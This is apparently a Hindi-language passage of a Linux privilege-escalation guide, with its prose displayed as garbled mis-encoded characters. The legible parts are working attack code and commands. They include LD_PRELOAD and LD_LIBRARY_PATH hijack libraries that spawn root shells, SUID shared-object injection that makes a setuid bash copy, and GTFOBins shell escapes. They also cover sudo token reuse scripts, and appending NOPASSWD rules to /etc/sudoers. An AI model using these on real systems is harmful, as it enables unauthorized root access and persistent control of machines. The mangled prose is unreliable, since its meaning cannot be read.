**LD\_PRELOAD** рдПрдХ рдРрд╕рд╛ рд╡реИрдХрд▓реНрдкрд┐рдХ рдкрд░реНрдпрд╛рд╡рд░рдгреАрдп рдЪрд░ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рд╕рд╛рдЭрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ, рдпрд╛ рд╕рд╛рдЭрд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕, рдХреЗ рдкрде рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд┐рдиреНрд╣реЗрдВ рд▓реЛрдбрд░ рд▓реЛрдб рдХрд░реЗрдЧрд╛, рдЗрд╕рдореЗрдВ рд╕реА рд░рдирдЯрд╛рдЗрдо рдкреБрд╕реНрддрдХрд╛рд▓рдп (libc.so) рд╕рд╣рд┐рдд рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рд╕рд╛рдЭрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╕реЗ рдкрд╣рд▓реЗред рдЗрд╕реЗ рдПрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдкреНрд░реАрд▓реЛрдб рдХрд░рдирд╛ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрджрд┐ _ruid != euid_ рд╣реЛ рддреЛ рд▓реЛрдбрд░ _LD\_PRELOAD_ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕реЗ _suid/sgid_ рдирд┐рд╖реНрдкрд╛рджрдиреАрдп рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╣рдорд▓рд╛ рд╡реЗрдХреНрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕ рддрд░рд╣ рдХреА рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЗ рд▓рд┐рдП, рдХреЗрд╡рд▓ рдорд╛рдирдХ рдкрде рдореЗрдВ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рдкреНрд░реАрд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ рднреА _suid/sgid_ рд╣реЛрдВрдЧреЗред

рдпрджрд┐ рдЖрдк **`sudo -l`** рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдЗрд╕ рд╡рд╛рдХреНрдпрд╛рдВрд╢ рдХреЛ рдкрд╛рддреЗ рд╣реИрдВ: _**env\_keep+=LD\_PRELOAD**_ рдФрд░ рдЖрдк sudo рдХреЗ рд╕рд╛рде рдХреБрдЫ рдХрдорд╛рдВрдб рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
Defaults        env_keep += LD_PRELOAD
```
рд╕рд╣реЗрдЬреЗрдВ рдЬреИрд╕реЗ **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
рдлрд┐рд░ рдЗрд╕реЗ **рдХрдВрдкрд╛рдЗрд▓** рдХрд░реЗрдВ:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
рдЕрдВрдд рдореЗрдВ, **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдПрдВ** рдЪрд▓ рд░рд╣рд╛ рд╣реИ
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
рдПрдХ рд╕рдорд╛рди рдкреНрд░рд╛рдЗрд╡реЗрд╕реАрдХ рдЕрдзрд┐рдХрд╛рд░ рдЙрд▓реНрд▓рдВрдШрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЕрдЧрд░ рд╣рдорд▓рд╛рд╡рд░ LD\_LIBRARY\_PATH env рдЪрд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЙрд╕реЗ рдкрде рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдЦреЛрдЬ рдХреА рдЬрд╛рдПрдЧреАред
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID рдмрд╛рдЗрдирд░реА - .so рдЗрдВрдЬреЗрдХреНрд╢рди

рдпрджрд┐ рдЖрдкрдХреЛ рдХреБрдЫ рдЕрдЬреАрдм рдмрд╛рдЗрдирд░реА рдорд┐рд▓рддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ **SUID** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ, рддреЛ рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рд╕рднреА **.so** рдлрд╝рд╛рдЗрд▓реЗрдВ **рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд▓реЛрдб** рд╣реЛ рд░рд╣реА рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЛ рдРрд╕рд╛ рдХреБрдЫ рдорд┐рд▓рддрд╛ рд╣реИ: _pen(тАЬ/home/user/.config/libcalc.soтАЭ, O\_RDONLY) = -1 ENOENT (рдРрд╕реА рдХреЛрдИ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдирд╣реАрдВ)_ рддреЛ рдЖрдк рдЗрд╕реЗ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдХреЛрдб рдХреЗ рд╕рд╛рде рдлрд╝рд╛рдЗрд▓ _/home/user/.config/libcalc.c_ рдмрдирд╛рдПрдВ:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рджреНрд╡рд╛рд░рд╛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ:
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
рдФрд░ рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВред

## рд╕рд╛рдЭрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
рдЕрдм рдЬрдм рд╣рдореЗрдВ рдПрдХ SUID рдмрд╛рдЗрдирд░реА рдорд┐рд▓ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ рдПрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╣рдо рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдирд╛рдо рдХреЗ рд╕рд╛рде рдкреБрд╕реНрддрдХрд╛рд▓рдп рдмрдирд╛рдПрдВ:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
рдЕрдЧрд░ рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддреНрд░реБрдЯрд┐ рдорд┐рд▓рддреА рд╣реИ, рддреЛ
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдХреА рдЧрдИ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдореЗрдВ `a_function_name` рдирд╛рдордХ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) рдПрдХ рд╕рдВрдЧреНрд░рд╣реАрдд рд╕реВрдЪреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ Unix рдмрд╛рдЗрдирд░реА рдХреА рд╡рд┐рдзрд┐ рд╕рдВрд╢реЛрдзрд┐рдд рдХреА рдЧрдИ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рджреМрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред [**GTFOArgs**](https://gtfoargs.github.io/) рдЗрд╕реА рдХрд╛ рдПрдХ рд╕рдВрд╕реНрдХрд░рдг рд╣реИ, рд▓реЗрдХрд┐рди рдРрд╕реЗ рдорд╛рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдЬрд╣рд╛рдВ рдЖрдк рдХреЗрд╡рд▓ рдПрдХ рдХрдорд╛рдВрдб рдореЗрдВ рддрд░реНрдХ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдкрд░рд┐рдпреЛрдЬрдирд╛ Unix рдмрд╛рдЗрдирд░реА рдХреЗ рд╡реИрдз рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдПрдХрддреНрд░рд┐рдд рдХрд░рддреА рд╣реИ рдЬрд┐рдирдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╢реЗрд▓ рдХреЛ рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХреЗ, рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХреА рдЬрд╛ рд╕рдХреЗрдВ, рдмрд╛рдЗрдВрдб рдФрд░ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдЙрддреНрдкрдиреНрди рдХреА рдЬрд╛ рд╕рдХреЗрдВ, рдФрд░ рдЕрдиреНрдп рдкреЛрд╕реНрдЯ-рдЙрддреНрдкрдиреНрди рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдХрд░реЗрдВред

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

рдпрджрд┐ рдЖрдк `sudo -l` рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЯреВрд▓ [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдХрд┐рд╕реА рд╕реБрджреЛ рдирд┐рдпрдо рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### Sudo рдЯреЛрдХрди рдХрд╛ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реБрджреЛ рдЕрдзрд┐рдХрд╛рд░** рд╡рд╛рд▓реА рд╢реЗрд▓ рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ рдЬрд╛рдирддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдЙрд╕реЗ `sudo` рдХреЗ рджреНрд╡рд╛рд░рд╛ рдХреБрдЫ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдлрд┐рд░, рдЖрдк **sudo рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╕рддреНрд░ рдХреЗ рдЯреЛрдХрди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХрд┐рд╕реА рднреА рдХрд╛рд░реНрдп рдХреЛ sudo рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░)ред

рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ:

* рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "_рдирдореВрдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛_" рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╢реЗрд▓ рд░рдЦрддреЗ рд╣реИрдВ
* "_рдирдореВрдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛_" рдиреЗ **`sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдХреЗ рдХреБрдЫ рдХрд╛рд░реНрдп **рдкрд┐рдЫрд▓реЗ 15 рдорд┐рдирдЯреЛрдВ** рдореЗрдВ рдХрд┐рдпрд╛ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рдореЗрдВ рдпрд╣реА рд╕рдордпрд╛рдВрддрд░ рд╣реИ рдЬреЛ рд╣рдореЗрдВ рдХрд┐рд╕реА рднреА рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рджрд░реНрдЬ рдХрд┐рдП рдмрд┐рдирд╛ `sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ)
* `cat /proc/sys/kernel/yama/ptrace_scope` 0 рд╣реИ
* `gdb` рдЙрдкрдпреЛрдЧ рдпреЛрдЧреНрдп рд╣реИ (рдЖрдк рдЗрд╕реЗ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)

(рдЖрдк `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` рдХреЗ рд╕рд╛рде `ptrace_scope` рдХреЛ рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ `/etc/sysctl.d/10-ptrace.conf` рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ `kernel.yama.ptrace_scope = 0` рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)

рдпрджрд┐ рдпреЗ рд╕рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рдкреВрд░реА рд╣реЛрддреА рд╣реИрдВ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ: [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **рдкрд╣рд▓рд╛ рдЙрддреНрдкрд╛рдж** (`exploit.sh`) _/tmp_ рдореЗрдВ `activate_sudo_token` рдмрд╛рдЗрдирд░реА рдмрдирд╛рдПрдЧрд╛ред рдЖрдк рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╕рддреНрд░ рдореЗрдВ sudo рдЯреЛрдХрди рдХреЛ **рд╕рдХреНрд░рд┐рдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдЖрдкрдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд░реВрдЯ рд╢реЗрд▓ рдирд╣реАрдВ рдорд┐рд▓реЗрдЧреА, `sudo su` рдХрд░реЗрдВ):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
*рджреВрд╕рд░рд╛ рдЙрддреНрдкрд╛рджрди** (`exploit_v2.sh`) _/tmp_ рдореЗрдВ рдПрдХ рд╢реЗрд▓ рд╢реЗрд▓ рдмрдирд╛рдПрдЧрд╛ **рдЬрд┐рд╕рдХреЗ рдорд╛рд▓рд┐рдХ root рд╣реЛрдЧрд╛ рдФрд░ setuid рд╣реЛрдЧрд╛**ред*
```bash
bash exploit_v2.sh
/tmp/sh -p
```
*рджреВрд╕рд░рд╛ рдЙрдкрдпреЛрдЧ** (`exploit_v3.sh`) **рдПрдХ sudoers рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдЧрд╛** рдЬреЛ **sudo рдЯреЛрдХрди рдХреЛ рдЕрдирдиреНрдд рдмрдирд╛рдПрдЧрд╛ рдФрд░ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ sudo рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред*
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо>

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рдмрдирд╛рдП рдЧрдП рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ, рддреЛ рдЖрдк [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) рдирд╛рдордХ рдмрд╛рдЗрдирд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ PID рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реБрджреЛ рдЯреЛрдХрди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк _/var/run/sudo/ts/sampleuser_ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ PID 1234 рдХреЗ рд╕рд╛рде рдПрдХ рд╢реЗрд▓ рд╣реИ, рддреЛ рдЖрдк **рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ** рдХрд░рдХреЗ рд╕реБрджреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

рдлрд╝рд╛рдЗрд▓ `/etc/sudoers` рдФрд░ `/etc/sudoers.d` рдлрд╝рд╛рдЗрд▓реЗрдВ `sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрдиреЗ рд╡рд╛рд▓реЛрдВ рдФрд░ рдЙрдирдХреЗ рддрд░реАрдХреЗ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреА рд╣реИрдВред рдпреЗ рдлрд╝рд╛рдЗрд▓реЗрдВ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреЗрд╡рд▓ рдпреВрдЬрд╝рд░ рд░реВрдЯ рдФрд░ рдЧреНрд░реБрдк рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдкрдврд╝реА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред\
рдпрджрд┐ рдЖрдк рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдкрдХреЛ рдХреБрдЫ **рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдФрд░ рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ **рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдкрдХреЛ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
рдпрджрд┐ рдЖрдк рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` рдмрд╛рдЗрдирд░реА рдХреЗ рд▓рд┐рдП `doas` рдЬреИрд╕реЗ рдХреБрдЫ рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ OpenBSD рдХреЗ рд▓рд┐рдП, рдЗрд╕рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ `/etc/doas.conf` рдкрд░ рдЬрд╛рдВрдЪрдирд╛ рди рднреВрд▓реЗрдВред
```
permit nopass demo as root cmd vim
```
### рд╕реБрдбреЛ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

рдпрджрд┐ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдорддреМрд░ рдкрд░ рдПрдХ рдорд╢реАрди рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ рдФрд░ `sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИ** рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рдПрдХ рд╢реЗрд▓ рд╣реИ, рддреЛ рдЖрдк **рдПрдХ рдирдпрд╛ рд╕реБрдбреЛ рдирд┐рд╖реНрдкрд╛рджрдирдХрд░реНрддрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдЖрдкрдХреЗ рдХреЛрдб рдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдФрд░ рдлрд┐рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред рдлрд┐рд░, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ $PATH рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП .bash\_profile рдореЗрдВ рдирдпрд╛ рдкрде рдЬреЛрдбрд╝реЗрдВ) рддрд╛рдХрд┐ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ sudo рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЖрдкрдХрд╛ рд╕реБрдбреЛ рдирд┐рд╖реНрдкрд╛рджрдирдХрд░реНрддрд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИред

